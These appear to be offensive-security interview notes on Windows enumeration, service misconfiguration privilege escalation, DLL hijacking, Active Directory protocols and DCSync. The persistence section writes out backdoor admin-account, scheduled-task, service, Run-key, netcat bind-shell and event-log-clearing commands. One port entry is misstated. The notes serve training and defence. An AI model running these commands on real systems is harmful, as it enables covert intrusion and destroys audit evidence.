---
description: 'Nice resource: https://www.thehacker.recipes/'
---

# FINAL INTERVIEW PREP

## Windows

### **Local Enumeration: Overview and Functionality**

**Local enumeration** refers to the process of gathering information about a system's configuration, settings, users, groups, installed software, and other resources from a local perspective. It is often used by administrators for auditing purposes or by attackers to discover vulnerabilities.

**How It Functions:**

1. **Information Gathering:** Tools and commands are used to extract details about the system's configuration, accounts, permissions, and installed software.
2. **Analysis:** The collected data is analyzed to identify misconfigurations, weaknesses, or potential vulnerabilities.

**How to Perform Local Enumeration on a Windows System:**

Here are some examples of commands and techniques used for local enumeration:

1. **Enumerate Users and Groups:**
   * `net user` (Lists all local users)
   * `net localgroup` (Lists all local groups and their members)
2. **Check Privileges and Security Policies:**
   * `whoami /priv` (Shows privileges of the current user)
   * `secedit /export /cfg C:\securityconfig.txt` (Exports security policies)
3. **Identify Running Services:**
   * `sc query` (Lists all running and stopped services)
   * `tasklist` (Lists all active processes)
4. **Check Installed Software:**
   * `wmic product get name,version` (Displays installed programs and versions)
5. **Network Information:**
   * `ipconfig /all` (Displays network configuration)
   * `netstat -ano` (Lists active network connections with associated processes)
6. **Filesystem Information:**
   * `dir /s` (Displays directory structure and contents)
   * `icacls` (Checks file and folder permissions)

### **How Attackers Use Local Enumeration for Privilege Escalation**

Once attackers gain local access to a Windows system, they use local enumeration to identify weaknesses they can exploit to elevate privileges or compromise the system further.

**Potential Attack Scenarios:**

1. **Discovering Weak Passwords:**
   * Attackers may check for accounts with weak or blank passwords using `net user`.
2. **Identifying Privileged Accounts:**
   * Using `net localgroup administrators` to list accounts with administrative privileges, attackers can target these accounts for privilege escalation.
3. **Finding Misconfigurations:**
   * Attackers can exploit misconfigured services, such as services running with SYSTEM privileges but accessible to low-privileged users (`sc qc [service-name]`).
4. **Abusing Privileges:**
   * If attackers identify sensitive privileges like `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` using `whoami /priv`, they may exploit techniques like **Token Impersonation** or **Named Pipe Impersonation** to escalate privileges.
5. **Leveraging Vulnerable Software:**
   * Enumeration of installed software using `wmic product get name,version` can help attackers identify outdated or vulnerable applications to exploit.
6. **File Permission Vulnerabilities:**
   * Attackers can identify files or folders with weak permissions using `icacls`. For example, writable directories in `C:\Program Files` might allow attackers to replace executables used by privileged users.
7. **Accessing Stored Credentials:**
   * Tools like `mimikatz` can extract stored credentials from memory, allowing attackers to impersonate other users or administrators.

### User Account Enumeration

#### **a. Identifying Accounts with Administrative or Elevated Privileges**

Once user accounts are enumerated, you can identify which accounts have administrative or elevated privileges by examining specific attributes, groups, and permissions associated with those accounts.

**Attributes and Groups to Look For:**

1. **Membership in Administrative Groups:**
   * Look for accounts in the **Administrators** group:
     * `net localgroup administrators` (Displays members of the local Administrators group)
   * Check for accounts in other privileged groups, such as:
     * **Power Users**
     * **Remote Desktop Users** (if they can access the system remotely)
     * **Backup Operators** (can bypass file permissions)
2. **Special Privileges:**
   * Use the `whoami /priv` command to check privileges. Look for sensitive privileges like:
     * `SeDebugPrivilege` (Debug Programs)
     * `SeTakeOwnershipPrivilege` (Take Ownership)
     * `SeImpersonatePrivilege` (Impersonate a Client)
3. **Group Policies or Domain Groups:**
   * On domain-joined systems, accounts in groups like **Domain Admins** or **Enterprise Admins** have elevated privileges across the domain.
4. **Login Rights and Access:**
   * Check user rights and access permissions using `gpresult /r` to see group membership and policies applied to specific accounts.

***

#### **b. Tools and Commands for User Account Enumeration**

**Built-in Windows Commands:**

1. **List Local Users:**
   * `net user` (Lists all local user accounts)
   * `wmic useraccount list full` (Provides detailed information about user accounts)
2. **List Group Memberships:**
   * `net localgroup` (Lists all groups)
   * `net localgroup [groupname]` (Lists members of a specific group, such as `Administrators`)
3. **Check Current User Privileges:**
   * `whoami /all` (Displays the current user’s group memberships and privileges)
4. **Domain Enumeration (if part of a domain):**
   * `net group /domain` (Lists domain groups)
   * `net group [groupname] /domain` (Lists members of a specific domain group)

**Third-Party Tools:**

1. **PowerShell Scripts:**
   * `Get-LocalUser` (PowerShell command to list local users)
   * `Get-LocalGroupMember -Group "Administrators"` (Lists members of the local Administrators group)
2. **Penetration Testing Tools:**
   * **PowerView** (Part of PowerSploit, used for advanced enumeration)
   * **BloodHound** (Visualizes user privileges and attack paths in Active Directory environments)
3. **PsExec and PsTools Suite (Sysinternals):**
   * Tools like `PsExec` can be used for remote enumeration of accounts and permissions.

***

#### **c. Making Persistence on a System with Administrative Privileges**

If you have admin privileges and can create a new user, you could establish persistence by creating a backdoor user or configuring settings to ensure your access remains undetected.

**Steps for Persistence:**

1. **Create a New User:**
   *   Use the following commands to create a user and add them to the Administrators group:

       ```cmd
       net user backdoor password123 /add
       net localgroup administrators backdoor /add
       ```
2. **Enable RDP Access for Persistence:**
   *   Allow the new user to log in remotely:

       ```cmd
       net localgroup "Remote Desktop Users" backdoor /add
       ```
   *   Open the RDP port if it’s closed:

       ```cmd
       netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
       ```
3. **Create a Scheduled Task:**
   *   Configure a task to re-establish access or execute malicious scripts periodically:

       ```cmd
       schtasks /create /sc daily /tn "BackdoorTask" /tr "C:\backdoor.exe" /ru backdoor /rp password123
       ```
4. **Set Up a Service:**
   *   Install a malicious service that automatically starts with elevated privileges:

       ```cmd
       sc create backdoor binpath= "C:\malicious.exe" start= auto
       ```
5. **Manipulate Registry for Persistence:**
   *   Add an entry in the registry for persistence:

       ```cmd
       reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
       ```
6. **Use Existing Tools:**
   *   Install tools like **netcat** or set up a reverse shell to regain access later:

       ```cmd
       nc -lvp 4444 -e cmd.exe
       ```

**Covering Tracks:**

1. **Clear Logs:**
   *   Use the `wevtutil` command to clear logs:

       ```cmd
       wevtutil cl System
       wevtutil cl Security
       ```
2. **Rename or Hide the User:**
   *   Rename the backdoor account to look legitimate:

       ```cmd
       net user backdoor admin1
       ```
   *   Disable the account but keep it in the Administrators group:

       ```cmd
       net user backdoor /active:no
       ```

By employing these methods, attackers can ensure long-term access while minimizing the likelihood of detection. However, implementing strong security measures and monitoring can help mitigate these risks.

### Service Enumeration

#### **a. Enumerating Services on a Compromised Windows System**

To enumerate services on a compromised Windows system, you can use a variety of built-in commands, PowerShell cmdlets, or third-party tools to gather detailed information about running and stopped services, including their configuration, permissions, and associated accounts.

**Commands and Tools for Enumerating Services:**

1. **Using Built-in Commands:**
   *   **List All Services:**

       ```cmd
       sc query
       ```

       (Displays the status of all services: running, stopped, or paused)
   *   **Detailed Service Information:**

       ```cmd
       sc qc [service-name]
       ```

       (Shows service configuration, including binary path, startup type, and the account it's running under)
   *   **List Only Running Services:**

       ```cmd
       tasklist /svc
       ```

       (Shows running processes and the services associated with them)
   *   **Export Service Configurations:**

       ```cmd
       sc query > services.txt
       ```
2. **Using PowerShell:**
   *   **List All Services:**

       ```powershell
       Get-Service
       ```

       (Shows a simple list of services and their statuses)
   *   **Detailed Information:**

       ```powershell
       Get-WmiObject -Class Win32_Service | Select-Object Name, StartMode, State, PathName, StartName
       ```
3. **Third-Party Tools:**
   * **PowerUp (PowerSploit module):** Used for automated enumeration of services and identification of misconfigurations.
   * **WinPEAS:** A comprehensive enumeration tool that scans for privilege escalation vectors, including service misconfigurations.

***

#### **b. Identifying and Exploiting Misconfigured Services**

Misconfigured services can often be exploited for privilege escalation, especially when they run with SYSTEM or administrative privileges but are improperly secured.

**Steps to Identify Misconfigurations:**

1. **Check Service Permissions:**
   * Use the `sc sdshow [service-name]` command to view the security descriptor of a service. Look for weak permissions like "Everyone" or "Authenticated Users" having `WRITE` or `CHANGE_CONFIG` access.
2. **Analyze Service Binary Path:**
   *   Check the `PathName` of the service using:

       ```cmd
       sc qc [service-name]
       ```

       Look for:

       * Unquoted service paths (e.g., `C:\Program Files\My Service\service.exe` instead of `"C:\Program Files\My Service\service.exe"`)
       * Writable directories in the service path.
3. **Verify User Context:**
   * Check the account under which the service is running using the `StartName` field from `sc qc` or `Get-WmiObject`.
4. **Startup Type:**
   * Identify services with `Auto` or `Delayed` startup that can be triggered upon reboot.
5. **Writable Service Binaries:**
   *   Check if the service binary file is writable using:

       ```cmd
       icacls "C:\path\to\service.exe"
       ```

**Exploitable Misconfigurations:**

1. **Unquoted Service Path Vulnerability:**
   * If a service binary path is unquoted and contains spaces, an attacker can place a malicious executable in a higher-precedence directory. For example:
     * `C:\Program Files\My Service\service.exe` → Place a malicious `My.exe` in `C:\Program Files\`.
2. **Weak Service Permissions:**
   *   If an attacker can modify the service configuration (e.g., `ChangeConfig` permissions), they can change the service's binary to their payload:

       ```cmd
       sc config [service-name] binpath= "C:\path\to\payload.exe"
       sc start [service-name]
       ```
3. **Writable Service Binaries:**
   * If the binary file is writable, replace it with a malicious executable. The next time the service starts, the attacker's code runs with the service's privileges.
4. **Startup Scripts:**
   * Exploit startup scripts or executables associated with a service.

***

#### **c. Identifying Services Running with SYSTEM or Administrative Privileges**

To determine which services are running with elevated privileges, examine their `StartName` attribute, which specifies the user account under which the service runs.

**Steps to Identify Privileged Services:**

1. **Check Service Account:**
   * Use the `sc qc [service-name]` or `Get-WmiObject` commands to inspect the `StartName` field:
     * `LocalSystem` or `NT AUTHORITY\SYSTEM`: The service has SYSTEM privileges.
     * `LocalService` or `NetworkService`: Limited built-in accounts with fewer privileges.
     * Domain Administrator or other privileged accounts: Indicates potential for privilege escalation.
2. **Filter Services by Privileges:**
   *   PowerShell example:

       ```powershell
       Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" }
       ```
3. **Look for Sensitive Services:**
   * Pay special attention to services critical to the OS, like:
     * **Windows Management Instrumentation (WMI)**
     * **Windows Defender**
     * **Remote Desktop Services**
     * Any custom services running as SYSTEM.

**Indicators of Privileged Services:**

* **StartName:** `LocalSystem`, `NT AUTHORITY\SYSTEM`, or `Administrator`
* **Privileges:** Services that can interact with the desktop or load drivers are particularly dangerous.
* **Startup Type:** Automatically started services are more likely to be exploitable for persistence.

### Automated Enumeration

#### **a. Popular Tools and Frameworks for Automated Enumeration in Privilege Escalation Attacks**

1. **Windows-Specific Tools:**
   * **WinPEAS (Privilege Escalation Awesome Scripts):** A comprehensive script for Windows privilege escalation that automates the discovery of vulnerabilities like misconfigured services, weak permissions, or sensitive files.
   * **PowerUp (PowerSploit):** A PowerShell module designed to automate privilege escalation checks on Windows systems, such as vulnerable services or improperly configured permissions.
   * **Seatbelt:** A C# enumeration tool for assessing the security posture of Windows systems, identifying misconfigurations, credentials, and more.
2. **Cross-Platform Tools:**
   * **Metasploit Framework:** Offers modules like `post/windows/gather/enum_services` for automated enumeration of services, credentials, and vulnerabilities.
   * **BloodHound:** Primarily for Active Directory environments, it maps out attack paths by analyzing user and group relationships.
   * **SharpUp:** A C# tool that automates privilege escalation checks on Windows systems.
3. **Others:**
   * **Empire (PowerShell Empire):** A post-exploitation framework that includes automated enumeration modules.
   * **PowerShell Scripts:** Tools like Nishang and PrivescCheck automate privilege escalation enumeration.
   * **Custom Python Scripts:** Attackers often use custom Python scripts tailored to specific environments.

### DLL Hijacking

{% embed url="https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8" %}

### DLL Hijacking vs DLL Injection

#### **Key Differences**

| Feature     | DLL Hijacking                         | DLL Injection                             |
| ----------- | ------------------------------------- | ----------------------------------------- |
| **Focus**   | Exploits the DLL search order.        | Injects a DLL into a running process.     |
| **Trigger** | Happens during application startup.   | Requires runtime access to the process.   |
| **Target**  | Legitimate application loading a DLL. | Specific process in memory.               |
| **Method**  | Replacing or planting a fake DLL.     | Using Windows API or memory manipulation. |
| **Usage**   | Usually malicious.                    | Can be malicious or legitimate.           |

***

#### **Real-World Examples**

* **DLL Hijacking**:
  * Exploiting Microsoft Office or other programs vulnerable to improper DLL search order.
  * Placing a malicious DLL in a writable directory (e.g., `Downloads` or `Temp`).
* **DLL Injection**:
  * Tools like **Mimikatz** use DLL injection to extract credentials.
  * Malware injecting keylogging functionality into browsers.

## AD

### NBT-NS vs DNS

* **NBT-NS** is primarily used for legacy support and local name resolution (via NetBIOS), whereas **DNS** is the modern and essential service used for global and domain name resolution in Active Directory.
* **NBT-NS** works with NetBIOS names and is limited to local networks, while **DNS** works with FQDNs and is essential for locating AD resources, including domain controllers.
* **NBT-NS** is still used when **DNS** cannot resolve the name or for compatibility with older systems and applications.
* In **Active Directory**, DNS is critical for the **domain controller location**, **Kerberos authentication**, and **replication**. NBT-NS is only used for backward compatibility and name resolution in older Windows environments.

In short, DNS is essential in Active Directory environments, whereas NBT-NS is more of a legacy protocol with limited use in modern AD deployments.

## LLMNR vs NBT-NS vs DNS

| Feature | **LLMNR** | **NBT-NS** | **DNS** |
| ------- | --------- | ---------- | ------- |

| **Purpose** | Resolves names on local network when DNS is unavailable | Resolves NetBIOS names to IP addresses | Resolves FQDNs to IP addresses, essential for AD |
| ----------- | ------------------------------------------------------- | -------------------------------------- | ------------------------------------------------ |

| **Scope** | Local network (link-local) | Local network (usually within the subnet) | Global (across internet and AD environments) |
| --------- | -------------------------- | ----------------------------------------- | -------------------------------------------- |

| **Protocol** | UDP port 5355 | UDP port 137 | UDP/TCP port 53 |
| ------------ | ------------- | ------------ | --------------- |

| **Type of Names Resolved** | Hostnames (e.g., `hostname.local`) | NetBIOS names (e.g., `WORKSTATION1`) | FQDNs (e.g., `server.example.com`) |
| -------------------------- | ---------------------------------- | ------------------------------------ | ---------------------------------- |

| **Uses in Active Directory** | Less commonly used, can be a fallback | Rarely used in modern AD environments | Critical for AD services (domain controllers, authentication) |
| ---------------------------- | ------------------------------------- | ------------------------------------- | ------------------------------------------------------------- |

| **Fallback Mechanism** | Yes, when DNS is not available | Yes, for legacy NetBIOS resolution | Primary and required in modern AD networks |
| ---------------------- | ------------------------------ | ---------------------------------- | ------------------------------------------ |

| **Security Considerations** | Vulnerable to MITM attacks, should be disabled if not needed | Vulnerable to name resolution poisoning and spoofing | Secure if configured correctly, supports DNSSEC |
| --------------------------- | ------------------------------------------------------------ | ---------------------------------------------------- | ----------------------------------------------- |

| **Modern Usage** | Used in smaller or simpler networks, can be disabled | Used in legacy systems or when DNS is not configured | Essential in all modern network infrastructures, especially AD |
| ---------------- | ---------------------------------------------------- | ---------------------------------------------------- | -------------------------------------------------------------- |



### Important ports in AD environment

* `53/TCP` and `53/UDP` for DNS
* `88/TCP` for Kerberos authentication
* `135/TCP` and `135/UDP` MS-RPC epmapper (EndPoint Mapper)
* `137/TCP` and `137/UDP` for NBT-NS
* `138/UDP` for NetBIOS datagram service
* `139/TCP` for NetBIOS session service
* `389/TCP` for LDAP
* `636/TCP` for LDAPS (LDAP over TLS/SSL)
* `445/TCP` and `445/UDP` for SMB
* `464/TCP` and `445/UDP` for Kerberos password change
* `3268/TCP` for LDAP Global Catalog
* `3269/TCP` for LDAP Global Catalog over TLS/SSL

### RID vs SID

| Feature               | **SID**                                                       | **RID**                                         |
| --------------------- | ------------------------------------------------------------- | ----------------------------------------------- |
| **Purpose**           | Globally unique identifier for security principals            | Unique identifier for objects within a domain   |
| **Structure**         | Domain identifier + RID                                       | The last part of the SID (individual object ID) |
| **Scope**             | Unique across the entire domain or forest                     | Unique within a single domain                   |
| **Use Case**          | Used in permissions, ACLs, authentication, and access control | Used to uniquely identify objects in a domain   |
| **Global Uniqueness** | Yes, it is globally unique in a forest                        | No, it is only unique within the domain         |

#### Summary:

* **SID** is a **global identifier** for an object in the Active Directory environment, used for security and access control across the entire domain or forest.
* **RID** is a **local identifier** within a domain, part of the SID, and uniquely identifies an object (like a user or group) within that domain. It is used to distinguish between objects in the same domain.

### DCSync

#### **What is DCSync?**

DCSync is a **post-exploitation technique** used in Active Directory (AD) environments to impersonate a Domain Controller (DC) and request sensitive data, including user password hashes. Essentially, it leverages the **Directory Replication Service (DRS)** protocol to pull data from the AD database.

Attackers use this technique to extract **password hashes**, **Kerberos keys**, and other critical secrets from the Domain Controller without needing direct access to it.

***

#### **How Does DCSync Work?**

1. **Active Directory Replication Basics:**
   * In AD, Domain Controllers replicate changes to each other using the **Directory Replication Service (DRS)**.
   * This service uses the **DSGetNCChanges()** function to synchronize data between DCs. It allows one DC to request information (e.g., password hashes) from another DC.
   * Only privileged accounts (e.g., Domain Admins, Enterprise Admins) or accounts with **replication permissions** can request this data.
2. **Abusing Replication Permissions:**
   * Attackers with **Domain Admin privileges** (or any account with replication rights) can abuse the DRS protocol to:
     * Pull **NTLM password hashes**.
     * Extract **Kerberos keys** (krbtgt account hash used to forge Golden Tickets).
     * Gather other sensitive user attributes.
   * This is done by simulating the behavior of a legitimate Domain Controller using tools like **Mimikatz**.
3. **Tools Used for DCSync:**
   * **Mimikatz**: Popular tool for executing DCSync. The `lsadump::dcsync` command allows attackers to fetch NTLM password hashes and Kerberos keys.
   * **Impacket**: Tools like `secretsdump.py` in Impacket can also perform DCSync attacks.

***

#### **Steps in a DCSync Attack:**

1. **Obtain Privileged Access:**
   * The attacker compromises an account with replication privileges (e.g., Domain Admin or an account explicitly delegated replication permissions).
   * Alternatively, escalate privileges to obtain such access.
2. **Execute the Attack:**
   * Use tools like Mimikatz or Impacket to simulate a Domain Controller and send replication requests.
   * The attacker requests specific data, such as:
     * NTLM password hashes for users.
     * The Kerberos **krbtgt** account hash.
     * Other sensitive AD attributes.
3.  **Utilize the Extracted Data:**

    * Use password hashes for **Pass-the-Hash (PtH)** attacks.
    * Forge **Golden Tickets** using the `krbtgt` hash for long-term AD persistence.
    * Move laterally and escalate privileges further in the network.



### Potatoes

Learn more: [https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

